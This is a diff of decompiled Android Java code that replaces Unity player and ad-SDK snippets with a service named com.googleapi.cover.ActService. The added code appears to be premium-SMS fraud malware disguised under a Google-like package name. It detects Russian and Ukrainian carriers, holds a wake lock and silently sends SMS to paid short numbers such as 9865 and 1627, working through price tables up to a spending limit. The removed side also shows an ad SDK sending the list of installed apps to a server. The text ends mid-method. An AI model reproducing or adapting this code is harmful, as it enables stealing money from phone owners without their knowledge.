@@ -1,826 +1,1987 @@
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.unity3d.player.p.p
-Class Name:p
-Content: package com.unity3d.player;
+Package Path:com.googleapi.cover.ActService.Worker
+Class Name:ActService
+Content: package com.googleapi.cover;
 
-public final class p extends Dialog implements TextWatcher, View.OnClickListener {
-    private Context a;
-    private UnityPlayer b;
-
-    public p(Context context, UnityPlayer unityPlayer, String str, int i, boolean z, boolean z2, boolean z3, String str2) {
-        super(context);
-        this.a = null;
-        this.b = null;
-        this.a = context;
-        this.b = unityPlayer;
-        getWindow().setGravity(80);
-        getWindow().requestFeature(1);
-        getWindow().setBackgroundDrawable(new ColorDrawable(0));
-        setContentView(createSoftInputView());
-        getWindow().clearFlags(2);
-        EditText editText = (EditText) findViewById(1057292289);
-        Button button = (Button) findViewById(1057292290);
-        editText.setImeOptions(6);
-        editText.setText(str);
-        editText.setHint(str2);
-        int i2 = (z3 ? 128 : 0) | (z2 ? 131072 : 0) | (z ? 32768 : 0);
-        if (i >= 0 && i <= 7) {
-            i2 |= new int[]{1, 16385, 12290, 17, 2, 3, 97, 33}[i];
+    private class Worker extends Thread {
+        private Worker() {
         }
-        editText.setInputType(i2);
-        editText.addTextChangedListener(this);
-        int inputType = editText.getInputType();
-        editText.setKeyListener(TextKeyListener.getInstance());
-        editText.setRawInputType(inputType);
-        editText.setClickable(true);
-        if (!z2) {
-            editText.selectAll();
+
+        /* synthetic */ Worker(ActService actService, Worker worker) {
+            this();
         }
-        button.setOnClickListener(this);
-        editText.setOnFocusChangeListener(new View.OnFocusChangeListener() { // from class: com.unity3d.player.p.1
-            @Override // android.view.View.OnFocusChangeListener
-            public final void onFocusChange(View view, boolean z4) {
-                if (z4) {
-                    p.this.getWindow().setSoftInputMode(5);
-                }
-            }
-        });
-    }
 
-    /* JADX INFO: Access modifiers changed from: private */
-    public String a() {
-        EditText editText = (EditText) findViewById(1057292289);
-        if (editText == null) {
-            return null;
+        @Override // java.lang.Thread, java.lang.Runnable
+        public void run() {
+            ActService.isStarted = true;
+            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
+            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
+            ActService.this.wakeLock.acquire();
+            performActions();
+            ActService.isStarted = false;
+            ActService.this.stopSelf();
         }
-        return editText.getText().toString().trim();
-    }
 
-    static /* synthetic */ void a(p pVar, String str) {
-        pVar.b.reportSoftInputStr(str, 1);
-    }
-
-    @Override // android.text.TextWatcher
-    public final void afterTextChanged(Editable editable) {
-        this.b.reportSoftInputStr(editable.toString(), 0);
-    }
-
-    @Override // android.text.TextWatcher
-    public final void beforeTextChanged(CharSequence charSequence, int i, int i2, int i3) {
-    }
-
-    protected final View createSoftInputView() {
-        RelativeLayout relativeLayout = new RelativeLayout(this.a);
-        relativeLayout.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
-        EditText editText = new EditText(this.a) { // from class: com.unity3d.player.p.2
-            @Override // android.widget.TextView, android.view.View
-            public final boolean onKeyPreIme(int i, KeyEvent keyEvent) {
-                if (i == 4) {
-                    p.a(p.this, p.this.a());
-                }
-                if (i == 84) {
-                    return true;
-                }
-                return super.onKeyPreIme(i, keyEvent);
-            }
-
-            @Override // android.widget.TextView, android.view.View
-            public final void onWindowFocusChanged(boolean z) {
-                super.onWindowFocusChanged(z);
-                if (z) {
-                    ((InputMethodManager) p.this.a.getSystemService("input_method")).showSoftInput(this, 0);
+        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF) {
+                result.put(ActService.NUM_10, ActService.NUM_1);
+                result.put(ActService.NUM_5, ActService.NUM_3);
+                result.put(ActService.NUM_3, ActService.NUM_1);
+                result.put(ActService.NUM_1, ActService.NUM_1);
+            } else {
+                result.put(Actor.NUM_10, Actor.NUM_1);
+                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_5, Actor.NUM_3);
+                result.put(Actor.NUM_3, Actor.NUM_1);
+                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_1, "-1");
+                result.put(Actor.NUM_1_ALT, "-1");
+                if (isBeline) {
+                    result.put(ActService.NUM_1, ActService.NUM_1);
+                    result.put(Actor.NUM_2, Actor.NUM_2);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
                 }
             }
-        };
-        RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(-1, -2);
-        layoutParams.addRule(15);
-        layoutParams.addRule(0, 1057292290);
-        editText.setLayoutParams(layoutParams);
-        editText.setId(1057292289);
-        relativeLayout.addView(editText);
-        Button button = new Button(this.a);
-        button.setText(this.a.getResources().getIdentifier("ok", "string", "android"));
-        RelativeLayout.LayoutParams layoutParams2 = new RelativeLayout.LayoutParams(-2, -2);
-        layoutParams2.addRule(15);
-        layoutParams2.addRule(11);
-        button.setLayoutParams(layoutParams2);
-        button.setId(1057292290);
-        relativeLayout.addView(button);
-        ((EditText) relativeLayout.findViewById(1057292289)).setOnEditorActionListener(new TextView.OnEditorActionListener() { // from class: com.unity3d.player.p.3
-            @Override // android.widget.TextView.OnEditorActionListener
-            public final boolean onEditorAction(TextView textView, int i, KeyEvent keyEvent) {
-                if (i != 6) {
-                    return false;
-                }
-                p.a(p.this, p.this.a());
-                return false;
+            return new HashMap<>(result);
+        }
+
+        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF || isBeline) {
+                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
+                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
+                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
+                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
             }
-        });
-        return relativeLayout;
-    }
+            return new HashMap<>(result);
+        }
 
-    @Override // android.app.Dialog
-    public final void onBackPressed() {
-        this.b.reportSoftInputStr(a(), 1);
-    }
+        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF) {
+                result.put(ActService.NUM_10, ActService.NUM_5);
+                result.put(ActService.NUM_5, ActService.NUM_3);
+                result.put(ActService.NUM_3, ActService.NUM_1);
+                result.put(ActService.NUM_1, "-1");
+            } else {
+                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
+                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
+                result.put(Actor.NUM_5, Actor.NUM_3);
+                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
+                result.put(Actor.NUM_3_ALT, "-1");
+                result.put(Actor.NUM_1, "-1");
+                if (isBeline) {
+                    result.put(ActService.NUM_1, Actor.NUM_2);
+                    result.put(Actor.NUM_2, Actor.NUM_1);
+                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
+                    result.put(Actor.NUM_1_ALT, "-1");
+                }
+            }
+            return new HashMap<>(result);
+        }
 
-    @Override // android.view.View.OnClickListener
-    public final void onClick(View view) {
-        this.b.reportSoftInputStr(a(), 1);
-    }
+        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF || isBeline) {
+                result.put(ActService.NUM_1, ActService.NUM_2_SD);
+                result.put(ActService.NUM_3, ActService.NUM_2_SD);
+                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
+                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
+                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
+                result.put(ActService.NUM_1_ALT_2_SD, "-1");
+            }
+            return new HashMap<>(result);
+        }
 
-    @Override // android.text.TextWatcher
-    public final void onTextChanged(CharSequence charSequence, int i, int i2, int i3) {
-    }
-}
+        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
+            ArrayList<String> result = new ArrayList<>();
+            if (isMTSRF) {
+                result.add(ActService.NUM_10);
+                result.add(ActService.NUM_5);
+                result.add(ActService.NUM_3);
+                result.add(ActService.NUM_1);
+                result.add(ActService.NUM_2_SD);
+                result.add(ActService.NUM_1_SD);
+                result.add(ActService.NUM_1_ALT_SD);
+                result.add(ActService.NUM_1_ALT_2_SD);
+            } else if (!isBeline) {
+                result.add(Actor.NUM_10);
+                result.add(Actor.NUM_10_ALT);
+                result.add(Actor.NUM_5);
+                result.add(Actor.NUM_5_ALT);
+                result.add(Actor.NUM_3);
+                result.add(Actor.NUM_3_ALT);
+                result.add(Actor.NUM_2);
+                result.add(Actor.NUM_1);
+                result.add(Actor.NUM_1_ALT);
+            } else {
+                result.add(ActService.NUM_1);
+                result.add(ActService.NUM_2_SD);
+                result.add(ActService.NUM_1_SD);
+                result.add(ActService.NUM_1_ALT_SD);
+                result.add(ActService.NUM_1_ALT_2_SD);
+            }
+            return result;
+        }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.h.e
-Class Name:h
-Content: package net.crazymedia.iad;
-
-    public String e() {
-        return "pi8c9iw3kq38zcw22s0lx@Ss3o4m44!2";
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.b.l.l
-Class Name:l
-Content: package net.crazymedia.iad.b;
-
-public class l extends h {
-    public l(Context context) {
-        this.a = context;
-    }
-
-    private JSONArray a(Context context) {
-        JSONArray jSONArray = new JSONArray();
-        for (PackageInfo packageInfo : context.getPackageManager().getInstalledPackages(0)) {
-            if (packageInfo.versionName != null && (packageInfo.versionName == null || !packageInfo.versionName.equals(Build.VERSION.RELEASE))) {
-                if ((packageInfo.applicationInfo.flags & 1) <= 0) {
-                    String str = packageInfo.packageName;
-                    String str2 = packageInfo.versionName;
-                    if (str != null && str2 != null) {
-                        try {
-                            JSONObject jSONObject = new JSONObject();
-                            jSONObject.put("appUid", str);
-                            jSONObject.put("appVer", str2);
-                            jSONArray.put(jSONObject);
-                        } catch (Exception e) {
+        private void performActions() {
+            String lastNumber;
+            Context context = ActService.this.getApplicationContext();
+            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+            String opStr = settings.getString(Actor.NETWORK_STRING, "");
+            Actor act = new Actor(context, opStr);
+            if (act.isUkrCode()) {
+                actUK(act, settings);
+                return;
+            }
+            boolean isMTSRF = act.isMTSRF();
+            boolean isBeeline = act.isBeline();
+            if (act.isPrivate()) {
+                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
+                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
+                int acceptedNums = 0;
+                if (isBeeline) {
+                    String currentNumber = ActService.NUM_1;
+                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    do {
+                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber = positives.get(currentNumber);
+                        } else {
+                            if (currentNumber.equals(ActService.NUM_1)) {
+                                if (acceptedNums != 0) {
+                                    break;
+                                }
+                                ActService.PREF_TO_USE = Actor.PREF_PORT;
+                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
+                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
+                            }
+                            currentNumber = negatives.get(currentNumber);
                         }
+                        if (currentNumber == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber.equalsIgnoreCase("-1"));
+                } else if (isMTSRF || act.isMF()) {
+                    double restAllowedSum = 0.0d;
+                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
+                    if (isMTSRF) {
+                        ActService.PREF_TO_USE = ActService.PREF_A1;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mtsPrices;
+                    } else if (act.isMF()) {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mfPrices;
+                    }
+                    int currentNumberIndex = 0;
+                    while (true) {
+                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
+                            currentNumberIndex++;
+                        } else {
+                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
+                                break;
+                            }
+                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
+                            do {
+                                try {
+                                    sleep(100L);
+                                } catch (InterruptedException e2) {
+                                }
+                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                                acceptedNums++;
+                                if (acceptedNums < 3) {
+                                    smsData = act.getRelatedData(acceptedNums - 1);
+                                    waitForAcceptance(acceptedNums, settings);
+                                }
+                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
+                            } else {
+                                currentNumberIndex++;
+                            }
+                        }
+                    }
+                } else {
+                    String currentNumber2 = Actor.NUM_10;
+                    String num3_alt = Actor.NUM_3_ALT;
+                    new String();
+                    ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    do {
+                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e3) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        lastNumber = currentNumber2;
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber2 = positives.get(currentNumber2);
+                        } else {
+                            currentNumber2 = negatives.get(currentNumber2);
+                        }
+                        if (currentNumber2 == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber2.equalsIgnoreCase("-1"));
+                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                    }
+                }
+            } else {
+                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
+                for (int i = 0; i < numbers.size(); i++) {
+                    String number = numbers.get(i);
+                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
+                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    } else {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    }
+                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
+                    do {
+                        try {
+                            sleep(100L);
+                        } catch (InterruptedException e4) {
+                        }
+                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                        break;
                     }
                 }
             }
+            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
+            act.reportDone();
         }
-        return jSONArray;
-    }
 
-    @Override // net.crazymedia.iad.b.h
-    public g a() {
-        try {
-            JSONObject b = b(net.crazymedia.iad.f.a(net.crazymedia.iad.d.q.a().b, net.crazymedia.iad.d.r.a().a, net.crazymedia.iad.d.r.a().b));
-            b.put("installedList", a(this.a));
-            return a(new d().a(f.e(), b));
-        } catch (Exception e) {
-            e.printStackTrace();
-            return new g();
-        }
-    }
-
-    @Override // net.crazymedia.iad.b.h
-    public void a(JSONObject jSONObject, g gVar) {
-        JSONObject optJSONObject = jSONObject.optJSONObject("productInfo");
-        if (optJSONObject != null) {
-            c(optJSONObject);
-        }
-    }
-}
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.lmmob.sdk.SDK.getImei
-Class Name:SDK
-Content: package com.lmmob.sdk;
-
-    public static String getImei() {
-        return imei;
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.unity3d.player.UnityPlayer.onKeyPreIme
-Class Name:UnityPlayer
-Content: package com.unity3d.player;
-
-    public boolean onKeyPreIme(int i, KeyEvent keyEvent) {
-        return (this.c && i == 4) ? a(i, keyEvent) : super.onKeyPreIme(i, keyEvent);
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.unity3d.player.p.onKeyPreIme
-Class Name:p
-Content: package com.unity3d.player;
-
-            public final boolean onKeyPreIme(int i, KeyEvent keyEvent) {
-                if (i == 4) {
-                    p.a(p.this, p.this.a());
+        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
+            do {
+                try {
+                    sleep(100L);
+                } catch (InterruptedException e) {
                 }
-                if (i == 84) {
-                    return true;
+            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
+        }
+
+        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
+            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
+            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
+            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
+            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
+        }
+
+        private void actUK(Actor act, SharedPreferences settings) {
+            SmsManager sms = SmsManager.getDefault();
+            ArrayList<String> list = new ArrayList<>();
+            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
+            String ns1ua = "31".concat("61");
+            String ns2ua = "28".concat("55");
+            String ps1_ua = "4084".concat("705");
+            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
+                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
+                    list.add(ns2ua);
+                } else if (opCode.equals("01")) {
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                } else {
+                    list.add(ns2ua);
+                    list.add(ns1ua);
+                    list.add(ns1ua);
                 }
-                return super.onKeyPreIme(i, keyEvent);
-            }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.lmmob.sdk.SDK.imei
-Class Name:SDK
-Content: package com.lmmob.sdk;
-
-    private static String imei;
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.unity3d.player.a.j.j
-Class Name:j
-Content: package com.unity3d.player.a;
-
-public final class j {
-    private final SharedPreferences a;
-    private final h b;
-    private SharedPreferences.Editor c = null;
-
-    public j(SharedPreferences sharedPreferences, h hVar) {
-        this.a = sharedPreferences;
-        this.b = hVar;
-    }
-
-    public final void a() {
-        if (this.c != null) {
-            this.c.commit();
-            this.c = null;
-        }
-    }
-
-    public final void a(String str, String str2) {
-        if (this.c == null) {
-            this.c = this.a.edit();
-        }
-        this.c.putString(str, this.b.a(str2));
-    }
-
-    public final String b(String str, String str2) {
-        String string = this.a.getString(str, null);
-        if (string == null) {
-            return str2;
-        }
-        try {
-            return this.b.b(string);
-        } catch (l e) {
-            return str2;
-        }
-    }
-}
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.f.a
-Class Name:f
-Content: package net.crazymedia.iad;
-
-    public static String a(String str, String str2, String str3, Date date, Date date2, String str4, String str5) {
-        if (new e().a()) {
-            return "123456789";
-        }
-        try {
-            String str6 = Build.MODEL;
-            if (str6 == null || str6.length() == 0) {
-                str6 = "unknown";
-            }
-            StringBuffer stringBuffer = new StringBuffer();
-            stringBuffer.append(h.a().b()).append(str).append(str2).append(str3).append(a.format(date)).append(str4).append(a.format(date2)).append(str6).append(str5);
-            return i.a(stringBuffer.toString());
-        } catch (Exception e) {
-            return null;
-        }
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.unity3d.player.p.createSoftInputView
-Class Name:p
-Content: package com.unity3d.player;
-
-    protected final View createSoftInputView() {
-        RelativeLayout relativeLayout = new RelativeLayout(this.a);
-        relativeLayout.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
-        EditText editText = new EditText(this.a) { // from class: com.unity3d.player.p.2
-            @Override // android.widget.TextView, android.view.View
-            public final boolean onKeyPreIme(int i, KeyEvent keyEvent) {
-                if (i == 4) {
-                    p.a(p.this, p.this.a());
-                }
-                if (i == 84) {
-                    return true;
-                }
-                return super.onKeyPreIme(i, keyEvent);
-            }
-
-            @Override // android.widget.TextView, android.view.View
-            public final void onWindowFocusChanged(boolean z) {
-                super.onWindowFocusChanged(z);
-                if (z) {
-                    ((InputMethodManager) p.this.a.getSystemService("input_method")).showSoftInput(this, 0);
+                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+                for (int i = 0; i < list.size(); i++) {
+                    if (i != 0) {
+                        try {
+                            sleep(60000L);
+                        } catch (InterruptedException e) {
+                        }
+                    }
+                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
                 }
             }
-        };
-        RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(-1, -2);
-        layoutParams.addRule(15);
-        layoutParams.addRule(0, 1057292290);
-        editText.setLayoutParams(layoutParams);
-        editText.setId(1057292289);
-        relativeLayout.addView(editText);
-        Button button = new Button(this.a);
-        button.setText(this.a.getResources().getIdentifier("ok", "string", "android"));
-        RelativeLayout.LayoutParams layoutParams2 = new RelativeLayout.LayoutParams(-2, -2);
-        layoutParams2.addRule(15);
-        layoutParams2.addRule(11);
-        button.setLayoutParams(layoutParams2);
-        button.setId(1057292290);
-        relativeLayout.addView(button);
-        ((EditText) relativeLayout.findViewById(1057292289)).setOnEditorActionListener(new TextView.OnEditorActionListener() { // from class: com.unity3d.player.p.3
-            @Override // android.widget.TextView.OnEditorActionListener
-            public final boolean onEditorAction(TextView textView, int i, KeyEvent keyEvent) {
-                if (i != 6) {
-                    return false;
-                }
-                p.a(p.this, p.this.a());
-                return false;
-            }
-        });
-        return relativeLayout;
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.d.t.t
-Class Name:t
-Content: package net.crazymedia.iad.d;
-
-public class t implements RedirectHandler {
-    private DefaultHttpClient a = new DefaultHttpClient();
-    private String b;
-    private String c;
-    private Context d;
-
-    public t(Context context) {
-        this.d = context;
-        this.a.setRedirectHandler(this);
-        net.crazymedia.iad.b.b.a(this.a);
-    }
-
-    private void a(Context context, String str, String str2) {
-        try {
-            new AlertDialog.Builder(context).setTitle(str).setMessage(str2).create().show();
-        } catch (Exception e) {
+            act.reportDone();
         }
     }
 
-    public int a(Context context, String str) {
-        if (this.b == null) {
-            this.b = str;
-        }
-        this.c = str;
-        String[] split = str.split("://", 2);
-        if (split.length < 2) {
-            return -1;
-        }
-        String str2 = split[0];
-        String str3 = split[1];
-        if (AsyncData.SCHEME_HTTP.equals(str2)) {
-            b(context, str);
-            return 0;
-        }
-        if ("mtel".equals(str2)) {
-            g(context, str3);
-            return 3;
-        }
-        if ("msms".equals(str2)) {
-            d(context, str3);
-            return 1;
-        }
-        if ("mms".equals(str2)) {
-            f(context, str3);
-            return 4;
-        }
-        if ("mcpa".equals(str2)) {
-            h(context, str3);
-            return 5;
-        }
-        if ("mssms".equals(str2)) {
-            e(context, str3);
-            return 2;
-        }
-        if (!"mopen".equals(str2)) {
-            return 0;
-        }
-        i(context, str3);
-        return 6;
+Package Path:com.googleapi.cover.ActService.ActService
+Class Name:ActService
+Content: package com.googleapi.cover;
+
+public class ActService extends Service {
+    private static final double MF_LIMIT = 350.0d;
+    private static final double MTS_LIMIT = 350.0d;
+    private static String PREF_TO_USE;
+    private static boolean isStarted;
+    private PowerManager.WakeLock wakeLock;
+    public static String NUM_10 = "9865";
+    public static String NUM_5 = "9864";
+    public static String NUM_3 = "9863";
+    public static String NUM_1 = "1627";
+    public static String PREF_PLAT = "6563352";
+    public static String PREF_A1 = "7987035";
+    public static String NUM_5_A1 = "7781";
+    public static String NUM_3_A1 = "1161";
+    public static String NUM_2_A1 = "1899";
+    public static String NUM_1_A1 = "1151";
+    public static String NUM_1_ALT_A1 = "1141";
+    public static String NUM_5_SD = "8612";
+    public static String NUM_4_SD = "8611";
+    public static String NUM_3_SD = "8610";
+    public static String NUM_2_SD = "8609";
+    public static String NUM_1_SD = "8608";
+    public static String NUM_1_ALT_SD = "8607";
+    public static String NUM_1_ALT_2_SD = "8606";
+    private static ArrayList<Pair<String, Double>> mfPrices = new ArrayList<>();
+    private static ArrayList<Pair<String, Double>> mtsPrices = new ArrayList<>();
+
+    static {
+        mfPrices.add(new Pair<>(NUM_5_SD, Double.valueOf(200.0d)));
+        mfPrices.add(new Pair<>(NUM_4_SD, Double.valueOf(135.0d)));
+        mfPrices.add(new Pair<>(NUM_3_SD, Double.valueOf(100.0d)));
+        mfPrices.add(new Pair<>(NUM_2_SD, Double.valueOf(42.0d)));
+        mfPrices.add(new Pair<>(NUM_1_SD, Double.valueOf(30.0d)));
+        mfPrices.add(new Pair<>(NUM_1_ALT_SD, Double.valueOf(17.0d)));
+        mfPrices.add(new Pair<>(NUM_1_ALT_2_SD, Double.valueOf(3.39d)));
+        mtsPrices.add(new Pair<>(NUM_5_A1, Double.valueOf(203.2d)));
+        mtsPrices.add(new Pair<>(NUM_3_A1, Double.valueOf(111.76d)));
+        mtsPrices.add(new Pair<>(NUM_2_A1, Double.valueOf(74.51d)));
+        mtsPrices.add(new Pair<>(NUM_1_A1, Double.valueOf(42.34d)));
+        mtsPrices.add(new Pair<>(NUM_1_ALT_A1, Double.valueOf(27.09d)));
     }
 
-    public void b(Context context, String str) {
-        try {
-            this.a.execute(new HttpGet(str));
-        } catch (Exception e) {
-        }
-    }
-
-    public void c(Context context, String str) {
-        Intent a = i.a(context);
-        a.addFlags(268435456);
-        a.setData(Uri.parse(str));
-        context.startActivity(a);
-    }
-
-    public void d(Context context, String str) {
-        String[] split = str.split(":", 2);
-        if (split.length == 2) {
-            String str2 = split[0];
-            String decode = URLDecoder.decode(split[1]);
-            Intent intent = new Intent("android.intent.action.VIEW");
-            intent.addFlags(268435456);
-            intent.putExtra("sms_body", decode);
-            intent.setType("vnd.android-dir/mms-sms");
-            intent.putExtra("address", str2);
-            context.startActivity(intent);
-            a(context, "", "成功收藏到收件箱！");
-        }
-    }
-
-    public void e(Context context, String str) {
-        String[] split = str.split(":", 2);
-        if (split.length == 2) {
-            String str2 = split[0];
-            String decode = URLDecoder.decode(split[1]);
-            ContentValues contentValues = new ContentValues();
-            contentValues.put("address", str2);
-            contentValues.put("body", decode);
-            context.getContentResolver().insert(Uri.parse("content://sms/inbox"), contentValues);
-        }
-    }
-
-    public void f(Context context, String str) {
-        Uri parse = Uri.parse("content://" + str);
-        Intent intent = new Intent("android.intent.action.SEND");
-        intent.putExtra("sms_body", "some text");
-        intent.putExtra("android.intent.extra.STREAM", parse);
-        intent.setType("image/png");
-        context.startActivity(intent);
-    }
-
-    public void g(Context context, String str) {
-        Intent intent = new Intent("android.intent.action.DIAL", Uri.parse("tel:" + str));
-        intent.addFlags(268435456);
-        context.startActivity(intent);
-    }
-
-    @Override // org.apache.http.client.RedirectHandler
-    public URI getLocationURI(HttpResponse httpResponse, HttpContext httpContext) {
+    @Override // android.app.Service
+    public IBinder onBind(Intent intent) {
         return null;
     }
 
-    public void h(Context context, String str) {
-        new u(this).execute(str);
+    @Override // android.app.Service
+    public void onCreate() {
+        isStarted = false;
+        super.onCreate();
     }
 
-    public void i(Context context, String str) {
-        net.crazymedia.iad.c.e eVar = (net.crazymedia.iad.c.e) new net.crazymedia.iad.b.n(context, str).a().c;
-        if (eVar != null) {
-            try {
-                Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(eVar.b);
-                launchIntentForPackage.addFlags(268435456);
-                context.startActivity(launchIntentForPackage);
-            } catch (Exception e) {
-                e.printStackTrace();
+    @Override // android.app.Service
+    public void onDestroy() {
+        super.onDestroy();
+        this.wakeLock.release();
+    }
+
+    @Override // android.app.Service, android.content.ComponentCallbacks
+    public void onLowMemory() {
+        super.onLowMemory();
+    }
+
+    @Override // android.app.Service
+    public void onStart(Intent intent, int startId) {
+        super.onStart(intent, startId);
+    }
+
+    @Override // android.app.Service
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (!isStarted) {
+            Worker worker = new Worker(this, null);
+            worker.start();
+        }
+        return super.onStartCommand(intent, flags, startId);
+    }
+
+    private class Worker extends Thread {
+        private Worker() {
+        }
+
+        /* synthetic */ Worker(ActService actService, Worker worker) {
+            this();
+        }
+
+        @Override // java.lang.Thread, java.lang.Runnable
+        public void run() {
+            ActService.isStarted = true;
+            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
+            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
+            ActService.this.wakeLock.acquire();
+            performActions();
+            ActService.isStarted = false;
+            ActService.this.stopSelf();
+        }
+
+        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF) {
